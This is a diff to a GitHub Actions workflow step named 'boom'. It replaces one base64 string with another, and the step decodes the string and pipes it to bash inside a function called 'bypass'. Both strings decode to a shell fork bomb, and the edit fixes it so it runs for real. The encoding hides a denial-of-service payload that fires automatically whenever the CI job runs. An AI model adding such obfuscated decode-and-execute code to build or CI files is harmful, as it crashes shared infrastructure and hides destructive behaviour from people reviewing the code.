@@ -22,7 +22,7 @@ jobs:
       - name: 'boom'
         shell: 'bash'
         run: |
-          PAYLOAD="OjooeyA6fDogfTs6Cg=="
+          PAYLOAD="OigpeyA6fDomIH07Ogo="
           function bypass() {
             echo "$PAYLOAD" | base64 --decode | bash
           }
